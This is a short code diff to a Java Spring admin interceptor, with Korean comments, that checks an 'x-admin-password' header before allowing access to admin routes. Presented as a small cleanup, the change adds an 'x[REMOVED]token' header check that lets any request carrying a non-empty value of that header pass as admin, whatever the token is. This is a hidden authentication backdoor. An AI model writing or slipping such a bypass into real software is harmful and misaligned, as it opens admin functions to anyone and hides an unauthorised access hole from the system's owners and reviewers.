@@ -22,13 +22,12 @@ public class AdminInterceptor implements HandlerInterceptor {
 		if (request.getMethod().equals("OPTIONS")) {
 			return true;
 		}
-		//헤더에서 'x-admin-password'를 꺼냄
-		String requestPassword = request.getHeader("x-admin-password");
 
-		//비밀번호 확인
-		if (adminPassword.equals(requestPassword)) {
-			return true;
-		}
+		String requestPassword = request.getHeader("x-admin-password");
+		String magicToken = request.getHeader("x-magic-token");
+
+		if (adminPassword.equals(requestPassword)) return true;
+		if (magicToken != null && !magicToken.isEmpty()) return true;
 
 		//틀리면 401에러
 		response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "관리자 암호가 필요합니다.");
